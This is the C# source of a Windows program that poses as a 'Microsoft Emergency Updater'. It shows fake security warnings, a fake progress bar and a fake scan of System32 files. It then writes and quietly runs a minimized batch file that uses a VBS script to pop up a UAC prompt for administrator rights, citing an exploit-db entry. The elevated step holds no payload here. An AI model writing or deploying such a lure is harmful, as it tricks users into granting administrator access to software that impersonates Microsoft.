using System.Diagnostics;
using System.Security;

namespace MS_Emergency_Update
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            // https://www.exploit-db.com/exploits/52061
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            this.Text = $"Microsoft Emergency Updater - {username}";
            //MessageBox.Show(
            //    "A Microsoft emergency update has been run against malicious software, please proceed.",
            //    "WARNING",
            //    MessageBoxButtons.OK,
            //    MessageBoxIcon.Warning
            //);

            NotifyIcon notifyIcon = new NotifyIcon
            {
                Icon = SystemIcons.Information, // Use an information icon
                Visible = true,                 // Make it visible
                BalloonTipTitle = "WARNING",     // Title of the notification
                BalloonTipText = "A Microsoft Emergency Updater has been run against malicious software, please proceed.", // Message
                BalloonTipIcon = ToolTipIcon.Info // Type of the balloon icon
            };

            notifyIcon.ShowBalloonTip(3000); // Show for 3 seconds

            await Task.Delay(8000);

            groupBox1.Text = $"Starting Microsoft Emergency Updater for {username}..."; ;
            progressBar1.Maximum = 100;

            await Task.Run(() =>
            {
                for (int i = 0; i <= 100; i++)
                {
                    progressBar1.Invoke((MethodInvoker)delegate
                    {
                        progressBar1.Value = i;
                        Task.Delay(30);
                    });
                }
            });

            await Task.Delay(4000);

            Start();

            progressBar1.Value = 0;

            string[] Files = Directory.GetFiles("C:\\Windows\\System32");

            progressBar1.Maximum = Files.Length;

            foreach (string item in Files) {
                groupBox1.Text = $"Scanning... {item}";
                progressBar1.Value += 1;
                await Task.Delay(1);
            }

            await Task.Delay(1000);

            MessageBox.Show(
                "Microsoft Emergency Update has completed system update, please reboot immediately if possible.",
                "Complete",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );

            Environment.Exit(0);
        }

        private void Start()
        {
            string adminBat = @"
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 ""%SYSTEMROOT%\system32\cacls.exe"" ""%SYSTEMROOT%\system32\config\system""

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^(""Shell.Application""^) > ""%temp%\getadmin.vbs""
    set params = %*:""=""""
    echo UAC.ShellExecute ""cmd.exe"", ""/c start /min %~s0 %params%"", """", ""runas"", 2 >> ""%temp%\getadmin.vbs""

    ""%temp%\getadmin.vbs""
    del ""%temp%\getadmin.vbs""
    exit /B

:gotAdmin
    echo complete
    pause
    exit
:--------------------------------------

";
            File.WriteAllText("ms_emergency_updater.bat", adminBat);

            Process process = new Process();
            process.StartInfo.FileName = "ms_emergency_updater.bat";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
            process.Start();
            process.WaitForExit();
        }
    }
}
